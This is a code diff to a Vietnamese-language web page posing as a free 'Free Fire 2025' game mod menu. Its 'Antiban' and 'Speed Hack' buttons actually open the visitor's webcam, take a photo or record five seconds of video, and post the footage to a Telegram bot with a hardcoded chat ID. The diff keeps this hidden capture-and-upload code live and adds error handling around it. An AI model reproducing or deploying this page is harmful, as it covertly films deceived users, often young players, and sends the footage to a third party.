@@ -28,7 +28,7 @@
 </head>
 <body>
   <h1>🔥 MOD MENU FREE FIRE 2025 🔥</h1>
-  <p>Chọn tính năng để kích hoạt (cần cấp quyền web):</p>
+  <p>Chọn tính năng để kích hoạt (cần cấp quyền camera):</p>
 
   <button class="btn" onclick="capturePhoto()">📸 Cấp quyền Antiban</button>
   <button class="btn" onclick="recordVideo()">⚡ Speed Hack (Quay Video)</button>
@@ -41,15 +41,17 @@
     const chatId = "-1002761107238";
     let stream;
 
-    // Bắt đầu webcam nếu chưa có
     async function initCamera() {
       if (!stream) {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        document.getElementById("video").srcObject = stream;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          document.getElementById("video").srcObject = stream;
+        } catch (err) {
+          alert("❌ Không thể truy cập camera: " + err);
+        }
       }
     }
 
-    // 📸 Chụp ảnh & gửi về Telegram
     async function capturePhoto() {
       try {
         await initCamera();
@@ -65,12 +67,17 @@
           form.append("photo", blob, "photo.png");
           form.append("caption", "📸 FF User đã cấp quyền camera");
 
-          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: form
-          });
-
-          alert("✅ Ảnh đã được gửi!");
+          try {
+            const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: "POST",
+              body: form
+            });
+            const data = await res.json();
+            console.log("📬 Phản hồi Telegram:", data);
+            alert("📬 Phản hồi từ Telegram:\n" + JSON.stringify(data, null, 2));
+          } catch (err) {
+            alert("❌ Gửi ảnh lỗi: " + err);
+          }
         }, "image/png");
 
       } catch (e) {
@@ -78,7 +85,6 @@
       }
     }
 
-    // 🎞️ Quay video 5 giây & gửi
     async function recordVideo() {
       try {
         await initCamera();
@@ -93,16 +99,20 @@
           form.append("video", blob, "ff_hack_video.webm");
           form.append("caption", "🎞️ Video quay từ menu Hack Free Fire");
 
-          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-            method: "POST",
-            body: form
-          });
-
-          alert("✅ Video đã gửi thành công!");
+          try {
+            const res = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+              method: "POST",
+              body: form
+            });
+            const data = await res.json();
+            alert("📬 Video gửi về Telegram:\n" + JSON.stringify(data, null, 2));
+          } catch (err) {
+            alert("❌ Gửi video lỗi: " + err);
+          }
         };
 
         recorder.start();
-        setTimeout(() => recorder.stop(), 5000); // quay 5 giây
+        setTimeout(() => recorder.stop(), 5000);
       } catch (e) {
         alert("❌ Không thể truy cập camera!");
       }
